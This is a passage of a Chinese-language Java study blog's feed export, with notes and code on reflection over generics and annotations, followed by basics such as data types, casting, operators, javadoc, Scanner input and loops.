class="hljs-keyword">class</span> <span class="hljs-title class_">Test11</span> &#123;<br>    <span class="hljs-comment">//泛型作为参数</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test01</span><span class="hljs-params">(Map&lt;String,User&gt; map, List&lt;User&gt; list)</span> &#123;<br><br>       System.out.println(<span class="hljs-string">&quot;test01&quot;</span>);<br>   &#125;<br>    <span class="hljs-comment">//泛型作为返回类型</span><br>    <span class="hljs-keyword">public</span> Map&lt;String,User&gt; <span class="hljs-title function_">test02</span><span class="hljs-params">()</span>&#123;<br>           System.out.println(<span class="hljs-string">&quot;test02&quot;</span>);<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>       &#125;<br><br><br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException &#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> Test11.class.getMethod(<span class="hljs-string">&quot;test01&quot;</span>, Map.class, List.class);<span class="hljs-comment">//Method对象</span><br>        Type[] genericExceptionTypes = method.getGenericParameterTypes();<span class="hljs-comment">//获得泛型的参数类型</span><br>        <span class="hljs-keyword">for</span> (Type genericParameterType : genericExceptionTypes) &#123;<br>            System.out.println(<span class="hljs-string">&quot;#&quot;</span>+genericParameterType);<br>                                                            <span class="hljs-comment">//ParameterizedType 表示一种参数化类型</span><br>            <span class="hljs-keyword">if</span> (genericParameterType <span class="hljs-keyword">instanceof</span> ParameterizedType) &#123;<br>                Type[] actualTypeArguments = ((ParameterizedType) genericParameterType).getActualTypeArguments();<span class="hljs-comment">//强转获得真实参数信息</span><br>                <span class="hljs-keyword">for</span>(Type actualTypeArgument : actualTypeArguments)&#123;<br>                    System.out.println(actualTypeArgument);<br>                &#125;<br>            &#125;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;========&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method2</span> <span class="hljs-operator">=</span> Test11.class.getMethod(<span class="hljs-string">&quot;test02&quot;</span>,<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Type</span> <span class="hljs-variable">genericReturnType</span> <span class="hljs-operator">=</span> method2.getGenericReturnType();<span class="hljs-comment">//获得泛型的返回类型</span><br>        <span class="hljs-keyword">if</span> (genericReturnType <span class="hljs-keyword">instanceof</span> ParameterizedType) &#123;<br>            Type[] actualTypeArguments = ((ParameterizedType) genericReturnType).getActualTypeArguments();<span class="hljs-comment">//强转获得真实参数信息</span><br>            <span class="hljs-keyword">for</span>(Type actualTypeArgument : actualTypeArguments)&#123;<br>                System.out.println(actualTypeArgument);<br>            &#125;<br>        &#125;<br>    &#125;<br><br><br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li><p>泛型可作为方法的参数也可作为方法的返回类型</p><p>总的思路是：</p><ol><li>先获得Method 方法</li><li>再获得泛型的参数类型或者返回类型（看泛型在哪个位置）</li><li>强转获得真实参数信息</li></ol></li></ul><h4 id="反射获取注解信息"><a href="#反射获取注解信息" class="headerlink" title="反射获取注解信息"></a>反射获取注解信息</h4><ul><li>ROM：Object relationship Mapping —–&gt; 对象关系映射</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zhang.reflection;<br><br><span class="hljs-keyword">import</span> java.lang.annotation.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-comment">//练习反射操作注解</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test13</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, NoSuchMethodException &#123;<br>        <span class="hljs-comment">//创建反射对象</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.zhang.reflection.Student33&quot;</span>);<br>        Annotation[] annotations = c1.getAnnotations();<br>        <span class="hljs-keyword">for</span> (Annotation annotation : annotations) &#123;<br>            System.out.println(annotation);<br>        &#125;<br><br>        <span class="hljs-comment">//获得指定注解的value值  类注解是直接由class对象操作</span><br>        <span class="hljs-type">A2</span> <span class="hljs-variable">annotationA2</span> <span class="hljs-operator">=</span> (A2)c1.getAnnotation(A2.class);  <span class="hljs-comment">//返回Annotation 类型的 强转成A2</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> annotationA2.value();<br>        System.out.println(value);<br>        <br>        <span class="hljs-comment">//获得指定的属性注解    属性注解 ： 先获得class对象，再由生成的Field对象 （抽象属性）操作</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameClass</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;id&quot;</span>);<br>        <span class="hljs-type">B</span> <span class="hljs-variable">annotation</span> <span class="hljs-operator">=</span> nameClass.getAnnotation(B.class);<span class="hljs-comment">//由（抽象）属性获得指定属性注解</span><br>        System.out.println(annotation.columnName());<br>        System.out.println(annotation.type());<br>        System.out.println(annotation.length());<br><br>        <span class="hljs-comment">//获得指定构造器注解亦同理</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> c1.getDeclaredConstructor(<span class="hljs-literal">null</span>);  <span class="hljs-comment">//这里注意获取指定的构造器括号里只需写参数类型，不能再写构造器名称了</span><br>        <span class="hljs-type">C</span> <span class="hljs-variable">annotation1</span> <span class="hljs-operator">=</span> (C)constructor.getAnnotation(C.class);<br>        System.out.println(annotation1.value());<br><br><br>    &#125;<br><br>&#125;<br><br><span class="hljs-meta">@A2(&quot;db_student&quot;)</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student33</span>&#123;<br>    <span class="hljs-meta">@B(columnName=&quot;db_name&quot;,type=&quot;varchar&quot;,length=3)</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-meta">@B(columnName=&quot;db_age&quot;,type=&quot;int&quot;,length=10)</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-meta">@B(columnName=&quot;db_id&quot;,type=&quot;int&quot;,length=10)</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> id;<br><br>    <span class="hljs-meta">@C(&quot;CONSTRUCTIR&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student33</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> id;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span> &#123;<br>        <span class="hljs-built_in">this</span>.id = id;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//自定义类注解</span><br><span class="hljs-meta">@Target(ElementType.TYPE)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@interface</span> A2 &#123;<br>    String <span class="hljs-title function_">value</span><span class="hljs-params">()</span>;<br>&#125;<br><br><span class="hljs-comment">//自定义属性的注解</span><br><span class="hljs-meta">@Target(ElementType.FIELD)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@interface</span> B&#123;<br>    String <span class="hljs-title function_">columnName</span><span class="hljs-params">()</span>;<br>    String <span class="hljs-title function_">type</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">length</span><span class="hljs-params">()</span>;<br>&#125;<br><br><span class="hljs-comment">//构造器注解</span><br><span class="hljs-meta">@Target(ElementType.CONSTRUCTOR)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@interface</span> C&#123;<br>   String <span class="hljs-title function_">value</span><span class="hljs-params">()</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="小总结-1"><a href="#小总结-1" class="headerlink" title="小总结"></a>小总结</h4><p>抽象对象（瞎编的一个词）  即由class对象下的各种Method&#x2F;Field&#x2F;Constructor对象（或它们下的对象）</p><ul><li><p>反射获得类注解</p><ol><li><p>获得class对象 c1</p></li><li><p>获得抽象注解：直接class对象c1 由<code>getAnnotation(指定注解.class) </code>获得指定（抽象的）类注解</p><p><strong>注意(抽象)类注解获得的时候自动返回Annotation类的，要强转一下，转成指定的类注解</strong></p></li><li><p>由(<strong>抽象的)类注解.value()</strong> 即可获得注解值</p></li></ol></li><li><p>反射获得属性注解</p><ol><li>获得class对象 c1</li><li>获得抽象属性：（多一步）由class对象c1 先生成（抽象即Field对象）属性对象:<ul><li>c1.getDeclaredField(name)</li></ul></li><li>(抽象)属性对象 由<code>getAnnotation(指定注解.class) </code>获得指定（抽象的）类注解</li><li>由(<strong>抽象的)类注解.value()</strong> 即可获得注解值</li></ol></li><li><p>反射获得构造器注解</p><ol><li>获得class对象 c1</li><li>获得抽象构造器：（多一步）由class对象c1 先生成（抽象即Constructor对象）构造器对象:<ul><li>c1.getDeclaredConstructor(参数class类)</li></ul></li><li>(抽象)构造器对象 由<code>getAnnotation(指定注解.class) </code>获得指定（抽象的）类注解</li><li>由(<strong>抽象的)类注解.value()</strong> 即可获得注解值</li></ol></li><li><p>反射获得方法注解同理</p></li></ul><p>（总的感觉从反射这一层来看：注解是抽象类的抽象属性&#x2F;方法&#x2F;构造器的下一抽象层）</p><p>什么类型的抽象对象.getAnnotation(什么类型的注解.class)—-&gt;得到抽象的一个注解</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Java基础</title>
    <link href="/2025/03/20/java-%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/03/20/java-%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><span id="more"></span><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><ul><li><p>单行注释&#x2F;&#x2F;  （ctrl +&#x2F;）</p></li><li><p>多行注释(ctrl+shift+&#x2F;)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/*文字*/<br></code></pre></td></tr></table></figure></li></ul><h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><ul><li>字母（大小写），数字，下划线，美元符组成，但不能以数字开头</li><li>大小写敏感</li></ul><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>基本数据类型，引用数据类型</p><ul><li><p>强类型语言：所有变量先定义后使用</p></li><li><p>基本数据类型：</p><p>数值类型：</p><ul><li>整数类型：byte（1个字节）,short（2个字节）,int(默认)(4个字节),long(long数字后要加L)（8个字节）</li><li>浮点类型：float(float 数字后要加F)，double(默认)</li><li>字符类型：char（2个字节）</li></ul><p>boolean:</p><p>​true false（1位）</p></li><li><p>引用类型：</p><ul><li>类</li><li>接口</li><li>数组</li></ul></li></ul><hr><p><strong>最好完全避免使用float类型的数字进行比较：float 离散，舍入误差</strong></p><p><strong>所有的字符本质上还是数字</strong></p><hr><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">String sa=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;hello world&quot;</span>);<br>String sb=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;hello world&quot;</span>);<br><br>System.out.println(sa==sb);<span class="hljs-comment">//false</span><br><br>String sc=<span class="hljs-string">&quot;hello world&quot;</span>;<br>String sd=<span class="hljs-string">&quot;hello world&quot;</span>;<br>System.out.println(sc==sd);<span class="hljs-comment">//true 对象  从内存分析</span><br></code></pre></td></tr></table></figure><hr><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><ul><li><p>低—–&gt;高</p><p>byte,short,char,int,long,float,double</p></li></ul><p>不能对布尔值进行转换</p><p><strong>强制转换</strong></p><ul><li>要避免内存溢出</li></ul><p><strong>自动转换</strong></p><ul><li><p>低—&gt;高</p></li><li><p>注意计算时内存溢出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> money=<span class="hljs-number">1000000000</span>;<br><span class="hljs-type">int</span> yers=<span class="hljs-number">20</span>;<br><span class="hljs-type">int</span> total=money*years<span class="hljs-comment">//结果为负数</span><br><span class="hljs-type">long</span> total2=money*years<span class="hljs-comment">//也为负，mony years 默认是int 计算之后还是int，在转换之前就出问题了</span><br><span class="hljs-type">long</span> total3=money*((<span class="hljs-type">long</span>)years)<span class="hljs-comment">//先把一个数转换成long</span><br></code></pre></td></tr></table></figure><hr><h4 id="数据类型的范围"><a href="#数据类型的范围" class="headerlink" title="数据类型的范围"></a>数据类型的范围</h4><ul><li>byte:<strong>-128-127</strong></li><li>short:<strong>-32768~32767</strong></li><li>int:<strong>-2147483648~2147483647</strong></li><li>long：**-9223372036854775808~9223372036854775807**</li></ul></li></ul><hr><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>类变量(static)，实例变量，局部变量</p><ul><li><p>实例变量：(在类里面 main方法外面）</p><p>从属于对象，如果不初始化，会有默认值</p><ul><li>所有的数字默认值是0 或 0.0</li><li>布尔值默认是：false</li><li>除基本数据类型外（即引用类型）：都是null</li></ul></li><li><p>类变量：**<u><em>static</em></u>** （当然也是在类里面main方法外面）</p><p>从属于类，<strong>可以直接在main里面直接调用</strong></p></li><li><p>局部变量：（在main方法里面）</p><p>必须声明变量类型和初始值</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dome01</span> &#123;<br><br>    <span class="hljs-comment">//类变量  static  从属类</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">double</span> salary=<span class="hljs-number">2500</span>;<br><br>    <span class="hljs-comment">//实例变量：从属于对象；（在类里面main方法外面）</span><br>    String name;<br>    <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-comment">//main 方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//局部变量，在main里面：必须声明变量类型和初始化值</span><br>        <span class="hljs-type">int</span> i=<span class="hljs-number">10</span>;<br>        System.out.println(i);<br><br>        <span class="hljs-comment">//变量类型  变量名称</span><br>        <span class="hljs-type">Dome01</span> <span class="hljs-variable">dome01</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dome01</span>();<br>        System.out.println(dome01);<br>        System.out.println(salary);<br>    &#125;<br><br><br></code></pre></td></tr></table></figure><hr><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><p>final  常量名 &#x3D;值</p><p>常量名一般使用大写字符</p><p>修饰符不存在先后顺序</p><p>命名规范</p><ul><li>所有变量，方法，类名：见名知意</li><li>类成员变量：首字母小写和驼峰原则（monthSalary）即除第一个单词外后面的单词首字母都大写</li><li>局部变量： 首字母小写+驼峰原则</li><li>常量：大写字母和下划线MAX_VALUE</li><li>类名：首字母大写+驼峰原则 Man GoodMan</li><li>方法名：首字母小写+驼峰原则</li></ul><hr><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><ul><li>long,int,short,byte 进行运算时，有long 的，直接变化为为long ，其余的都是**<u><em>自动转化为int</em></u>**</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> operator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dome01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">long</span> a=<span class="hljs-number">1231231323123132L</span>;<br>        <span class="hljs-type">int</span> b=<span class="hljs-number">123</span>;<br>        <span class="hljs-type">short</span> c=<span class="hljs-number">10</span>;<br>        <span class="hljs-type">byte</span> d=<span class="hljs-number">8</span>;<br>        System.out.println(a+b+c+d);<span class="hljs-comment">//long</span><br>        System.out.println(b+c+d);<span class="hljs-comment">//int</span><br>        System.out.println(c+d);<span class="hljs-comment">//int</span><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>关系运算符返回结果：true,false</p><ul><li>instanceof 关系运算符</li></ul></li><li><p>自增减运算符</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> a=<span class="hljs-number">3</span>;<br><span class="hljs-type">int</span> b=a++;<br>System.out.println(b);<span class="hljs-comment">//b=3  a=4</span><br><span class="hljs-type">int</span> c=++a;<br>System.out.println(c);<span class="hljs-comment">//c=5   a=5</span><br>System.out.println(a);<span class="hljs-comment">//a=5</span><br><br><br></code></pre></td></tr></table></figure></li><li><p>逻辑运算符：and or !</p></li><li><p>位运算符：</p><p>&amp;：两个都是1才为1</p><p>|：都是0才为0</p><p>^：对应位相同为0，不同为1</p><p><code>&lt;&lt; </code>:*2</p><p><code>&gt;&gt;</code>:&#x2F;2</p></li><li><p>连接符+：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> operator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dome03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> a=<span class="hljs-number">10</span>;<br>        <span class="hljs-type">int</span> b=<span class="hljs-number">20</span>;<br>        System.out.println(a+b);<span class="hljs-comment">//30</span><br>        System.out.println(<span class="hljs-string">&quot;&quot;</span>+a+b);<span class="hljs-comment">//1020</span><br>        System.out.println(a+b+<span class="hljs-string">&quot;&quot;</span>);<span class="hljs-comment">//30</span><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>三元运算符</p><p>x ? y : z</p><hr></li></ul><h3 id="包机制"><a href="#包机制" class="headerlink" title="包机制"></a>包机制</h3><p>语法格式为：<br><code>package package1[.package2[.package3...]];</code></p><p>在正式的开发中，一般都采用公司域名倒置来作为包名</p><p>导入包，使用<code>import</code>语句将其导入，具体语法如下：<br><code>import package1[.package2[.package3...]].(ClassName|*);</code></p><h3 id="javaDoc"><a href="#javaDoc" class="headerlink" title="javaDoc"></a>javaDoc</h3><p>将注释信息生成帮助文档</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@auther</span> <br><span class="hljs-meta">@Version</span><br><span class="hljs-meta">@Since</span><br><span class="hljs-meta">@param</span><br><span class="hljs-meta">@throws</span><br></code></pre></td></tr></table></figure><p>javaDoc用来生成自己的API文档</p><p><strong>生成文档：</strong>cmd打开：<strong>javadoc  -encoding UTF-8 -charset UTF-8  Doc.java</strong>  UTF-8编码，避免出现非英语字符乱码</p><p>在代码文件对应的位置会多出许多文件，index.html打开就是生成的文档</p><p><a href="https://blog.csdn.net/vbirdbest/article/details/80296136">理解Javadoc-CSDN博客</a></p><h2 id="————"><a href="#————" class="headerlink" title="————"></a>————</h2><h3 id="Scanner对象"><a href="#Scanner对象" class="headerlink" title="Scanner对象"></a>Scanner对象</h3><ul><li>next接受以空格作为结束标志</li><li>nextLine接受 回车作为结束标志</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.scanner;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dome01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">//创建扫描器对象，用于接收键盘数据</span><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        System.out.println(<span class="hljs-string">&quot;使用next方法接收：&quot;</span>);<br>        <span class="hljs-comment">//判断用户有没有输入字符串</span><br>        <span class="hljs-keyword">if</span> (scanner.hasNext())&#123;<br>            <span class="hljs-comment">//使用next方式接受</span><br>            String str=scanner.next();<br>            System.out.println(<span class="hljs-string">&quot;输出内容为：&quot;</span>+str);<br>        &#125;<br>        <span class="hljs-comment">//属于IO流类的不关闭会占用资源</span><br>        scanner.close();<br><br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>小练习</p><p>接受double类型的数字并计算总和及平均值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.scanner;<br><br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dome03</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">double</span> sum=<span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> m=<span class="hljs-number">0</span>;<br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        <span class="hljs-keyword">while</span> (scanner.hasNextDouble()) &#123;<br>            <span class="hljs-type">double</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> scanner.nextDouble();<br>            sum=sum+a;<br>            m++;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;sum为&quot;</span>+sum);<br>        System.out.println(<span class="hljs-string">&quot;平均数为&quot;</span>+(sum/m));<br>        scanner.close();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><hr><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><ul><li><p>选择结构 </p><p>if </p><p>switch:</p><ul><li><p>注意case穿透现象，写完每个case后都应该加上一个break</p></li><li><p>jdk7后switch也支持字符串比较即括号里的表达式也可以是字符串（字符串用双引号）</p></li></ul></li><li><p>循环结构</p><p>while,do…while</p><p>for:</p><ul><li><p>(for (int i &#x3D; 0; i &lt; 100; i++) {}):快捷键：<strong>100.for</strong></p></li><li><p>for(;;) {}死循环</p><p>九九乘法表小练习</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zhang.struct;<br><br><span 